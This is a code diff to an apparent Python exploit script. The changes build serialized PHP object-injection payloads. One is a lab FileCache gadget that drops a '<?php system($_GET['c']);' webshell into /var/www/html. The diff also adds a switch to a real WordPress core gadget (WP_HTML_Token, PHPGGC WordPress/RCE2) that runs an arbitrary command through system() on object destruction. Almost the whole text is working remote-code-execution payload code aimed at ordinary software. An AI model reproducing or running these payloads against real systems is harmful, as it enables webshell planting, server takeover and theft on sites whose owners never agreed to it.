@@ -59,11 +59,16 @@ def set_geometry(name: str) -> None:
     global LEN2, L1, CL_R
     g = GEOMETRIES[name]
     LEN2, L1, CL_R = g["LEN2"], g["L1"], g["CL_R"]
-# RCE payload record: FileCache gadget (see app/gadget.php). Its __destruct
-# drops a webshell at /var/www/html/<SHELL_NAME> when the consumer request
-# ends. The name is randomised per run so a stale shell can never fake a
-# hit. <?php is always available (unlike short tags, which are a config).
+# RCE payload record. Default: the lab's FileCache gadget (see
+# app/gadget.php), whose __destruct drops a webshell at
+# /var/www/html/<SHELL_NAME> when the consumer request ends.
+# set_gadget("wordpress", ...) swaps in a REAL WordPress core gadget
+# instead (PHPGGC WordPress/RCE2, see obj_bytes). The name is
+# randomised per run so a stale shell can never fake a hit.
+# <?php is always available (unlike short tags, which are a config).
 SHELL_NAME = "s.php"
+GADGET = "filecache"
+WP_ARG = ""
 
 
 def set_shell(name: str) -> None:
@@ -71,19 +76,41 @@ def set_shell(name: str) -> None:
     SHELL_NAME = name
 
 
+def set_gadget(name: str, arg: str = "") -> None:
+    """Choose the planted record: 'filecache' (lab gadget, writes a
+    webshell) or 'wordpress' (real WP core gadget, runs arg via
+    system() from __destruct)."""
+    global GADGET, WP_ARG
+    GADGET, WP_ARG = name, arg
+
+
 def shell_path() -> str:
     return "/" + SHELL_NAME
 
 
+# separator between a serialized length and its value: ':' + '"'
+# (kept as an explicit constant so nested quoting can never corrupt it)
+SEP = b":" + b'"'
+
+
 def obj_bytes() -> bytes:
+    if GADGET == "wordpress":
+        # PHPGGC WordPress/RCE2: WordPress core's WP_HTML_Token calls
+        # $this->on_destroy($this->bookmark_name) from __destruct.
+        # bookmark_name carries "<command>;echo <marker>" - the marker
+        # is how the exploit recognises success in the response body.
+        arg = WP_ARG.encode()
+        return (b'evil|O:13:"WP_HTML_Token":2:{s:13:"bookmark_name";s:'
+                + str(len(arg)).encode() + SEP + arg
+                + b'";s:10:"on_destroy";s:6:"system";}')
     path = f"/var/www/html/{SHELL_NAME}".encode()
     # <?php, not <?= : system() already PRINTS its output, and <?= would
     # additionally echo system()'s return value - doubling every command.
     content = b"<?php system($_GET['c']);"
     return (b'evil|O:9:"FileCache":2:{s:4:"path";s:'
-            + str(len(path)).encode() + b':"' + path
+            + str(len(path)).encode() + SEP + path
             + b'";s:7:"content";s:' + str(len(content)).encode()
-            + b':"' + content + b'";}')
+            + SEP + content + b'";}')
 
 
 def new_shell_name() -> str:
